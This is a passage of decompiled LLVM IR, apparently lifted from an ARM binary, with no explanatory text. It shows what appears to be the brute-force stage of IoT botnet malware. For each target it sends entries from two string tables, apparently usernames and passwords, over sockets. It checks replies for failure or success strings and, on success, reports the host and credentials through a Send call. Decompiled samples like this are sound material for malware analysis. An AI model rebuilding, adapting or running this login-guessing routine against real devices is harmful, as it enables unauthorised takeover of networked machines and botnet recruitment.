  br i1 %v7_172ec, label %dec_label_pc_172f4, label %dec_label_pc_173e4

dec_label_pc_172f4:                               ; preds = %dec_label_pc_17234
  store i32 %storemerge548, i32* @r4, align 4
  %v2_172fc = call i32 @__GI_time(i32* null)
  %v0_17310 = load i32, i32* @r4, align 4
  %v3_17310 = mul i32 %v0_17310, 32
  %v2_17318 = add i32 %v2_1741c, %v3_17310
  %v2_1731c = inttoptr i32 %v2_17318 to i32*
  store i32 %v2_172fc, i32* %v2_1731c, align 8
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_17338 = load i32, i32* %v6_1723c, align 8
  store i32 %v7_17338, i32* %r2.global-to-local, align 4
  store i32 %v2_1733c, i32* %ip.global-to-local, align 4
  %v1_17344 = load i32, i32* @sp, align 4
  %v2_17344 = inttoptr i32 %v1_17344 to i32*
  store i32 %v2_17340, i32* %v2_17344, align 4
  %v0_17348 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_1733c, i32* %r3.global-to-local, align 4
  %v4_17358 = load i32, i32* %stack_var_-340, align 4
  %v5_17358 = call i32 @getsockopt(i32 %v0_17348, i32 1, i32 4, i32 %v2_1733c, i32 %v4_17358)
  %v3_1735c = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1735c, i32* %r3.global-to-local, align 4
  %v2_17360 = icmp eq i32 %v3_1735c, 0
  br i1 %v2_17360, label %dec_label_pc_17384, label %dec_label_pc_17368

dec_label_pc_17368:                               ; preds = %dec_label_pc_172f4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_1737c = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_17384:                               ; preds = %dec_label_pc_172f4
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_1738c = load i32, i32* %v6_1723c, align 8
  store i32 %v7_1738c, i32* @r4, align 4
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_17398 = load i32, i32* %v6_1723c, align 8
  store i32 %v7_17398, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_173a8 = call i32 @fcntl(i32 %v7_17398, i32 3, i32 0)
  %v1_173b0 = and i32 %v3_173a8, -2049
  store i32 %v1_173b0, i32* @r3, align 4
  %v0_173b4 = load i32, i32* @r4, align 4
  store i32 %v1_173b0, i32* %r2.global-to-local, align 4
  %v3_173c0 = call i32 @fcntl(i32 %v0_173b4, i32 4, i32 %v1_173b0)
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v2_173dc = inttoptr i32 %v2_16e3c to i32*
  %v3_173dc = call i32 @advance_state(i32* %v2_173dc, i32 2)
  br label %dec_label_pc_17d6c

dec_label_pc_173e4:                               ; preds = %dec_label_pc_17234
  store i32 %v5_172dc, i32* %r3.global-to-local, align 4
  %v3_173e8 = icmp eq i32 %v5_172dc, -1
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  br i1 %v3_173e8, label %dec_label_pc_173f0, label %dec_label_pc_1740c

dec_label_pc_173f0:                               ; preds = %dec_label_pc_173e4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_17404 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_1740c:                               ; preds = %dec_label_pc_173e4
  %v2_17420 = add i32 %v3_16e38, %v2_1741c
  store i32 %v2_17420, i32* %r3.global-to-local, align 4
  %v1_17424 = inttoptr i32 %v2_17420 to i32*
  %v2_17424 = load i32, i32* %v1_17424, align 8
  store i32 %v2_17424, i32* %r3.global-to-local, align 4
  %v1_17428 = add i32 %v2_17424, 7
  store i32 %v1_17428, i32* @r4, align 4
  %v2_17430 = call i32 @__GI_time(i32* null)
  store i32 %v2_17430, i32* %r3.global-to-local, align 4
  %v0_17438 = load i32, i32* @r4, align 4
  %v3_17438 = icmp ult i32 %v0_17438, %v2_17430
  br i1 %v3_17438, label %dec_label_pc_17440, label %dec_label_pc_17d6c

dec_label_pc_17440:                               ; preds = %dec_label_pc_1740c
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_17454 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_1745c:                               ; preds = %dec_label_pc_16e7c
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v4_17464 = mul i32 %storemerge548, 32
  %v5_17464 = add i32 %v4_17464, %v3_16d60
  %v6_17464 = inttoptr i32 %v5_17464 to i32*
  %v7_17464 = load i32, i32* %v6_17464, align 8
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_1747c = add i32 %v3_16e38, %v2_17478
  store i32 %v2_1747c, i32* %r3.global-to-local, align 4
  %v1_17480 = inttoptr i32 %v2_1747c to i32*
  %v2_17480 = load i32, i32* %v1_17480, align 4
  store i32 %v2_17480, i32* %r2.global-to-local, align 4
  %v1_17488 = load i32, i32* @sp, align 4
  %v2_17488 = inttoptr i32 %v1_17488 to i32*
  store i32 ptrtoint (i32* @global_var_452a0 to i32), i32* %v2_17488, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_17494 = inttoptr i32 %v2_17480 to i8*
  %v5_17494 = call i32 @read_until_response(i32 %v7_17464, i32 %arg1, i8* %v4_17494, i32 1024)
  store i32 %v5_17494, i32* %r3.global-to-local, align 4
  %v2_1749c = icmp eq i32 %v5_17494, 0
  br i1 %v2_1749c, label %dec_label_pc_17540, label %dec_label_pc_174a4

dec_label_pc_174a4:                               ; preds = %dec_label_pc_1745c
  store i32 %storemerge548, i32* @r4, align 4
  %v2_174ac = call i32 @__GI_time(i32* null)
  %v0_174c0 = load i32, i32* @r4, align 4
  %v3_174c0 = mul i32 %v0_174c0, 32
  %v2_174c8 = add i32 %v2_1741c, %v3_174c0
  %v2_174cc = inttoptr i32 %v2_174c8 to i32*
  store i32 %v2_174ac, i32* %v2_174cc, align 8
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_1747c, i32* %r3.global-to-local, align 4
  %v2_174e8 = load i32, i32* %v1_17480, align 4
  store i32 %v2_174e8, i32* %r3.global-to-local, align 4
  %v1_174f0 = call i32 @contains_fail(i32 %v2_174e8)
  %v2_174f8 = icmp eq i32 %v1_174f0, 0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  br i1 %v2_174f8, label %dec_label_pc_17520, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174a4
  %v2_17518 = inttoptr i32 %v2_16e3c to i32*
  %v3_17518 = call i32 @advance_state(i32* %v2_17518, i32 0)
  br label %dec_label_pc_17d6c

dec_label_pc_17520:                               ; preds = %dec_label_pc_174a4
  %v2_17538 = inttoptr i32 %v2_16e3c to i32*
  %v3_17538 = call i32 @advance_state(i32* %v2_17538, i32 3)
  br label %dec_label_pc_17d6c

dec_label_pc_17540:                               ; preds = %dec_label_pc_1745c
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_17554 = add i32 %v3_16e38, %v2_1741c
  store i32 %v2_17554, i32* %r3.global-to-local, align 4
  %v1_17558 = inttoptr i32 %v2_17554 to i32*
  %v2_17558 = load i32, i32* %v1_17558, align 8
  store i32 %v2_17558, i32* %r3.global-to-local, align 4
  %v1_1755c = add i32 %v2_17558, 7
  store i32 %v1_1755c, i32* @r4, align 4
  %v2_17564 = call i32 @__GI_time(i32* null)
  store i32 %v2_17564, i32* %r3.global-to-local, align 4
  %v0_1756c = load i32, i32* @r4, align 4
  %v3_1756c = icmp ult i32 %v0_1756c, %v2_17564
  br i1 %v3_1756c, label %dec_label_pc_17574, label %dec_label_pc_17d6c

dec_label_pc_17574:                               ; preds = %dec_label_pc_17540
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_17588 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_17590:                               ; preds = %dec_label_pc_16e7c
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v4_17598 = mul i32 %storemerge548, 32
  %v5_17598 = add i32 %v4_17598, %v3_16d60
  %v6_17598 = inttoptr i32 %v5_17598 to i32*
  %v7_17598 = load i32, i32* %v6_17598, align 8
  store i32 %v7_17598, i32* @r4, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_175b0 = add i32 %v2_16e3c, 8
  store i32 %v2_175b0, i32* %r3.global-to-local, align 4
  %v1_175b4 = add i32 %v2_16e3c, 10
  %v2_175b4 = inttoptr i32 %v1_175b4 to i8*
  %v3_175b4 = load i8, i8* %v2_175b4, align 2
  %v4_175b4 = zext i8 %v3_175b4 to i32
  store i32 %v4_175b4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32), i32* %r3.global-to-local, align 4
  %v4_175c0 = mul nuw nsw i32 %v4_175b4, 4
  %v5_175c0 = add i32 %v4_175c0, ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32)
  %v6_175c0 = inttoptr i32 %v5_175c0 to i32*
  %v7_175c0 = load i32, i32* %v6_175c0, align 4
  store i32 %v7_175c0, i32* @r5, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_175b0, i32* %r3.global-to-local, align 4
  %v3_175dc = load i8, i8* %v2_175b4, align 2
  %v4_175dc = zext i8 %v3_175dc to i32
  store i32 %v4_175dc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32), i32* %r3.global-to-local, align 4
  %v4_175e8 = mul nuw nsw i32 %v4_175dc, 4
  %v5_175e8 = add i32 %v4_175e8, ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32)
  %v6_175e8 = inttoptr i32 %v5_175e8 to i32*
  %v7_175e8 = load i32, i32* %v6_175e8, align 4
  store i32 %v7_175e8, i32* %r3.global-to-local, align 4
  %v1_175ec = inttoptr i32 %v7_175e8 to i8*
  %v3_175f0 = call i32 @strlen(i8* %v1_175ec)
  %v0_175f8 = load i32, i32* @r4, align 4
  %v0_175fc = load i32, i32* @r5, align 4
  store i32 %v3_175f0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_17608 = call i32 @send(i32 %v0_175f8, i32 %v0_175fc, i32 %v3_175f0, i32 16384)
  store i32 %v4_17608, i32* %r3.global-to-local, align 4
  %v1_17610 = icmp slt i32 %v4_17608, 0
  br i1 %v1_17610, label %dec_label_pc_17618, label %dec_label_pc_17634

dec_label_pc_17618:                               ; preds = %dec_label_pc_17590
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_1762c = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_17634:                               ; preds = %dec_label_pc_17590
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_1763c = load i32, i32* %v6_17598, align 8
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_17650 = call i32 @send(i32 %v7_1763c, i32 ptrtoint ([3 x i8]* @global_var_385ec.665 to i32), i32 2, i32 16384)
  %v1_17658 = icmp slt i32 %v5_17650, 0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  br i1 %v1_17658, label %dec_label_pc_17660, label %dec_label_pc_1767c

dec_label_pc_17660:                               ; preds = %dec_label_pc_17634
  %v1_17674 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_1767c:                               ; preds = %dec_label_pc_17634
  %v2_17694 = inttoptr i32 %v2_16e3c to i32*
  %v3_17694 = call i32 @advance_state(i32* %v2_17694, i32 4)
  br label %dec_label_pc_17d6c

dec_label_pc_1769c:                               ; preds = %dec_label_pc_16e7c
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v4_176a4 = mul i32 %storemerge548, 32
  %v5_176a4 = add i32 %v4_176a4, %v3_16d60
  %v6_176a4 = inttoptr i32 %v5_176a4 to i32*
  %v7_176a4 = load i32, i32* %v6_176a4, align 8
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_176bc = add i32 %v3_16e38, %v2_17478
  store i32 %v2_176bc, i32* %r3.global-to-local, align 4
  %v1_176c0 = inttoptr i32 %v2_176bc to i32*
  %v2_176c0 = load i32, i32* %v1_176c0, align 4
  store i32 %v2_176c0, i32* %r2.global-to-local, align 4
  %v1_176c8 = load i32, i32* @sp, align 4
  %v2_176c8 = inttoptr i32 %v1_176c8 to i32*
  store i32 ptrtoint (i32* @global_var_452a0 to i32), i32* %v2_176c8, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_176d4 = inttoptr i32 %v2_176c0 to i8*
  %v5_176d4 = call i32 @read_until_response(i32 %v7_176a4, i32 %arg1, i8* %v4_176d4, i32 1024)
  store i32 %v5_176d4, i32* %r3.global-to-local, align 4
  %v2_176dc = icmp eq i32 %v5_176d4, 0
  br i1 %v2_176dc, label %dec_label_pc_17780, label %dec_label_pc_176e4

dec_label_pc_176e4:                               ; preds = %dec_label_pc_1769c
  store i32 %storemerge548, i32* @r4, align 4
  %v2_176ec = call i32 @__GI_time(i32* null)
  %v0_17700 = load i32, i32* @r4, align 4
  %v3_17700 = mul i32 %v0_17700, 32
  %v2_17708 = add i32 %v2_1741c, %v3_17700
  %v2_1770c = inttoptr i32 %v2_17708 to i32*
  store i32 %v2_176ec, i32* %v2_1770c, align 8
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_176bc, i32* %r3.global-to-local, align 4
  %v2_17728 = load i32, i32* %v1_176c0, align 4
  store i32 %v2_17728, i32* %r3.global-to-local, align 4
  %v1_17730 = call i32 @contains_fail(i32 %v2_17728)
  %v2_17738 = icmp eq i32 %v1_17730, 0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  br i1 %v2_17738, label %dec_label_pc_17760, label %dec_label_pc_17740

dec_label_pc_17740:                               ; preds = %dec_label_pc_176e4
  %v2_17758 = inttoptr i32 %v2_16e3c to i32*
  %v3_17758 = call i32 @advance_state(i32* %v2_17758, i32 0)
  br label %dec_label_pc_17d6c

dec_label_pc_17760:                               ; preds = %dec_label_pc_176e4
  %v2_17778 = inttoptr i32 %v2_16e3c to i32*
  %v3_17778 = call i32 @advance_state(i32* %v2_17778, i32 5)
  br label %dec_label_pc_17d6c

dec_label_pc_17780:                               ; preds = %dec_label_pc_1769c
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_17794 = add i32 %v3_16e38, %v2_1741c
  store i32 %v2_17794, i32* %r3.global-to-local, align 4
  %v1_17798 = inttoptr i32 %v2_17794 to i32*
  %v2_17798 = load i32, i32* %v1_17798, align 8
  store i32 %v2_17798, i32* %r3.global-to-local, align 4
  %v1_1779c = add i32 %v2_17798, 7
  store i32 %v1_1779c, i32* @r4, align 4
  %v2_177a4 = call i32 @__GI_time(i32* null)
  store i32 %v2_177a4, i32* %r3.global-to-local, align 4
  %v0_177ac = load i32, i32* @r4, align 4
  %v3_177ac = icmp ult i32 %v0_177ac, %v2_177a4
  br i1 %v3_177ac, label %dec_label_pc_177b4, label %dec_label_pc_17d6c

dec_label_pc_177b4:                               ; preds = %dec_label_pc_17780
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_177c8 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_177d0:                               ; preds = %dec_label_pc_16e7c
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v4_177d8 = mul i32 %storemerge548, 32
  %v5_177d8 = add i32 %v4_177d8, %v3_16d60
  %v6_177d8 = inttoptr i32 %v5_177d8 to i32*
  %v7_177d8 = load i32, i32* %v6_177d8, align 8
  store i32 %v7_177d8, i32* @r4, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_177f0 = add i32 %v2_16e3c, 8
  store i32 %v2_177f0, i32* %r3.global-to-local, align 4
  %v1_177f4 = add i32 %v2_16e3c, 11
  %v2_177f4 = inttoptr i32 %v1_177f4 to i8*
  %v3_177f4 = load i8, i8* %v2_177f4, align 1
  %v4_177f4 = zext i8 %v3_177f4 to i32
  store i32 %v4_177f4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([66 x i8*]* @global_var_45194.804 to i32), i32* %r3.global-to-local, align 4
  %v4_17800 = mul nuw nsw i32 %v4_177f4, 4
  %v5_17800 = add i32 %v4_17800, ptrtoint ([66 x i8*]* @global_var_45194.804 to i32)
  %v6_17800 = inttoptr i32 %v5_17800 to i32*
  %v7_17800 = load i32, i32* %v6_17800, align 4
  store i32 %v7_17800, i32* @r5, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_177f0, i32* %r3.global-to-local, align 4
  %v3_1781c = load i8, i8* %v2_177f4, align 1
  %v4_1781c = zext i8 %v3_1781c to i32
  store i32 %v4_1781c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([66 x i8*]* @global_var_45194.804 to i32), i32* %r3.global-to-local, align 4
  %v4_17828 = mul nuw nsw i32 %v4_1781c, 4
  %v5_17828 = add i32 %v4_17828, ptrtoint ([66 x i8*]* @global_var_45194.804 to i32)
  %v6_17828 = inttoptr i32 %v5_17828 to i32*
  %v7_17828 = load i32, i32* %v6_17828, align 4
  store i32 %v7_17828, i32* %r3.global-to-local, align 4
  %v1_1782c = inttoptr i32 %v7_17828 to i8*
  %v3_17830 = call i32 @strlen(i8* %v1_1782c)
  %v0_17838 = load i32, i32* @r4, align 4
  %v0_1783c = load i32, i32* @r5, align 4
  store i32 %v3_17830, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_17848 = call i32 @send(i32 %v0_17838, i32 %v0_1783c, i32 %v3_17830, i32 16384)
  store i32 %v4_17848, i32* %r3.global-to-local, align 4
  %v1_17850 = icmp slt i32 %v4_17848, 0
  br i1 %v1_17850, label %dec_label_pc_17858, label %dec_label_pc_17874

dec_label_pc_17858:                               ; preds = %dec_label_pc_177d0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_1786c = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_17874:                               ; preds = %dec_label_pc_177d0
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v7_1787c = load i32, i32* %v6_177d8, align 8
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_17890 = call i32 @send(i32 %v7_1787c, i32 ptrtoint ([3 x i8]* @global_var_385ec.665 to i32), i32 2, i32 16384)
  %v1_17898 = icmp slt i32 %v5_17890, 0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  br i1 %v1_17898, label %dec_label_pc_178a0, label %dec_label_pc_178bc

dec_label_pc_178a0:                               ; preds = %dec_label_pc_17874
  %v1_178b4 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_178bc:                               ; preds = %dec_label_pc_17874
  %v2_178d4 = inttoptr i32 %v2_16e3c to i32*
  %v3_178d4 = call i32 @advance_state(i32* %v2_178d4, i32 6)
  br label %dec_label_pc_17d6c

dec_label_pc_178dc:                               ; preds = %dec_label_pc_16e7c
  store i32 %storemerge548, i32* %r2.global-to-local, align 4
  store i32 %v3_16d60, i32* %r3.global-to-local, align 4
  %v4_178e4 = mul i32 %storemerge548, 32
  %v5_178e4 = add i32 %v4_178e4, %v3_16d60
  %v6_178e4 = inttoptr i32 %v5_178e4 to i32*
  %v7_178e4 = load i32, i32* %v6_178e4, align 8
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_178fc = add i32 %v3_16e38, %v2_17478
  store i32 %v2_178fc, i32* %r3.global-to-local, align 4
  %v1_17900 = inttoptr i32 %v2_178fc to i32*
  %v2_17900 = load i32, i32* %v1_17900, align 4
  store i32 %v2_17900, i32* %r2.global-to-local, align 4
  %v1_17908 = load i32, i32* @sp, align 4
  %v2_17908 = inttoptr i32 %v1_17908 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_45328.669 to i32), i32* %v2_17908, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_17914 = inttoptr i32 %v2_17900 to i8*
  %v5_17914 = call i32 @read_until_response(i32 %v7_178e4, i32 %arg1, i8* %v4_17914, i32 1024)
  store i32 %v5_17914, i32* %r3.global-to-local, align 4
  %v2_1791c = icmp eq i32 %v5_17914, 0
  br i1 %v2_1791c, label %dec_label_pc_17ae0, label %dec_label_pc_17924

dec_label_pc_17924:                               ; preds = %dec_label_pc_178dc
  store i32 %storemerge548, i32* @r4, align 4
  %v2_1792c = call i32 @__GI_time(i32* null)
  %v0_17940 = load i32, i32* @r4, align 4
  %v3_17940 = mul i32 %v0_17940, 32
  %v2_17948 = add i32 %v2_1741c, %v3_17940
  %v2_1794c = inttoptr i32 %v2_17948 to i32*
  store i32 %v2_1792c, i32* %v2_1794c, align 8
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_178fc, i32* %r3.global-to-local, align 4
  %v2_17968 = load i32, i32* %v1_17900, align 4
  store i32 %v2_17968, i32* %r3.global-to-local, align 4
  %v1_17970 = call i32 @contains_fail(i32 %v2_17968)
  store i32 %v1_17970, i32* %r3.global-to-local, align 4
  %v2_17978 = icmp eq i32 %v1_17970, 0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  br i1 %v2_17978, label %dec_label_pc_179a0, label %dec_label_pc_17980

dec_label_pc_17980:                               ; preds = %dec_label_pc_17924
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v2_17998 = inttoptr i32 %v2_16e3c to i32*
  %v3_17998 = call i32 @advance_state(i32* %v2_17998, i32 0)
  br label %dec_label_pc_17d6c

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17924
  store i32 %v2_178fc, i32* %r3.global-to-local, align 4
  %v2_179b8 = load i32, i32* %v1_17900, align 4
  store i32 %v2_179b8, i32* %r3.global-to-local, align 4
  %v1_179c0 = call i32 @contains_success(i32 %v2_179b8)
  store i32 %v1_179c0, i32* %r3.global-to-local, align 4
  %v2_179c8 = icmp eq i32 %v1_179c0, 0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  br i1 %v2_179c8, label %dec_label_pc_17ac4, label %dec_label_pc_179d0

dec_label_pc_179d0:                               ; preds = %dec_label_pc_179a0
  %v2_179e4 = add i32 %v2_16e3c, 8
  store i32 %v2_179e4, i32* %r3.global-to-local, align 4
  %v1_179e8 = add i32 %v2_16e3c, 9
  %v2_179e8 = inttoptr i32 %v1_179e8 to i8*
  %v3_179e8 = load i8, i8* %v2_179e8, align 1
  %v4_179e8 = zext i8 %v3_179e8 to i32
  store i32 %v4_179e8, i32* %r3.global-to-local, align 4
  %v7_179ec = icmp eq i8 %v3_179e8, 2
  br i1 %v7_179ec, label %dec_label_pc_179f4, label %dec_label_pc_17a14

dec_label_pc_179f4:                               ; preds = %dec_label_pc_179d0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v2_17a0c = inttoptr i32 %v2_16e3c to i32*
  %v3_17a0c = call i32 @advance_state(i32* %v2_17a0c, i32 7)
  br label %dec_label_pc_17d6c

dec_label_pc_17a14:                               ; preds = %dec_label_pc_179d0
  %v2_17a18 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_17a18, i32* @r4, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v3_17a30 = call i32 @get_ipstate_host(i32 %v2_16e3c, i32 8, i32 %v3_16d60)
  store i32 %v3_17a30, i32* %ip.global-to-local, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_179e4, i32* %r3.global-to-local, align 4
  %v1_17a50 = add i32 %v2_16e3c, 10
  %v2_17a50 = inttoptr i32 %v1_17a50 to i8*
  %v3_17a50 = load i8, i8* %v2_17a50, align 2
  %v4_17a50 = zext i8 %v3_17a50 to i32
  store i32 %v4_17a50, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32), i32* %r3.global-to-local, align 4
  %v4_17a5c = mul nuw nsw i32 %v4_17a50, 4
  %v5_17a5c = add i32 %v4_17a5c, ptrtoint ([128 x i8*]* @global_var_4509c.801 to i32)
  %v6_17a5c = inttoptr i32 %v5_17a5c to i32*
  %v7_17a5c = load i32, i32* %v6_17a5c, align 4
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_179e4, i32* %r3.global-to-local, align 4
  %v1_17a78 = add i32 %v2_16e3c, 11
  %v2_17a78 = inttoptr i32 %v1_17a78 to i8*
  %v3_17a78 = load i8, i8* %v2_17a78, align 1
  %v4_17a78 = zext i8 %v3_17a78 to i32
  store i32 %v4_17a78, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([66 x i8*]* @global_var_45194.804 to i32), i32* %r3.global-to-local, align 4
  %v4_17a84 = mul nuw nsw i32 %v4_17a78, 4
  %v5_17a84 = add i32 %v4_17a84, ptrtoint ([66 x i8*]* @global_var_45194.804 to i32)
  %v6_17a84 = inttoptr i32 %v5_17a84 to i32*
  %v7_17a84 = load i32, i32* %v6_17a84, align 4
  store i32 %v7_17a84, i32* %r3.global-to-local, align 4
  %v1_17a88 = load i32, i32* @sp, align 4
  %v2_17a88 = inttoptr i32 %v1_17a88 to i32*
  store i32 %v7_17a5c, i32* %v2_17a88, align 4
  %v0_17a8c = load i32, i32* %r3.global-to-local, align 4
  %v1_17a8c = load i32, i32* @sp, align 4
  %v2_17a8c = add i32 %v1_17a8c, 4
  %v3_17a8c = inttoptr i32 %v2_17a8c to i32*
  store i32 %v0_17a8c, i32* %v3_17a8c, align 4
  %v0_17a98 = load i32, i32* @r4, align 4
  store i32 %v0_17a98, i32* @r2, align 4
  %v0_17a9c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_17a9c, i32* %r3.global-to-local, align 4
  %v3_17aa0 = call i32 @Send(i32 %arg3, i32 ptrtoint ([51 x i8]* @global_var_386a8.808 to i32))
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v2_17abc = inttoptr i32 %v2_16e3c to i32*
  %v3_17abc = call i32 @advance_state(i32* %v2_17abc, i32 7)
  br label %dec_label_pc_17d6c

dec_label_pc_17ac4:                               ; preds = %dec_label_pc_179a0
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_17ad8 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_17ae0:                               ; preds = %dec_label_pc_178dc
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  %v2_17af4 = add i32 %v3_16e38, %v2_1741c
  store i32 %v2_17af4, i32* %r3.global-to-local, align 4
  %v1_17af8 = inttoptr i32 %v2_17af4 to i32*
  %v2_17af8 = load i32, i32* %v1_17af8, align 8
  store i32 %v2_17af8, i32* %r3.global-to-local, align 4
  %v1_17afc = add i32 %v2_17af8, 7
  store i32 %v1_17afc, i32* @r4, align 4
  %v2_17b04 = call i32 @__GI_time(i32* null)
  store i32 %v2_17b04, i32* %r3.global-to-local, align 4
  %v0_17b0c = load i32, i32* @r4, align 4
  %v3_17b0c = icmp ult i32 %v0_17b0c, %v2_17b04
  br i1 %v3_17b0c, label %dec_label_pc_17b14, label %dec_label_pc_17d6c

dec_label_pc_17b14:                               ; preds = %dec_label_pc_17ae0
  store i32 %v3_16d60, i32* %r2.global-to-local, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v1_17b28 = call i32 @reset_ipstate(i32 %v2_16e3c)
  br label %dec_label_pc_17d6c

dec_label_pc_17b30:                               ; preds = %dec_label_pc_16e7c
  store i32 %storemerge548, i32* @r4, align 4
  %v2_17b38 = call i32 @__GI_time(i32* null)
  %v0_17b4c = load i32, i32* @r4, align 4
  %v3_17b4c = mul i32 %v0_17b4c, 32
  %v2_17b54 = add i32 %v2_1741c, %v3_17b4c
  %v2_17b58 = inttoptr i32 %v2_17b54 to i32*
  store i32 %v2_17b38, i32* %v2_17b58, align 8
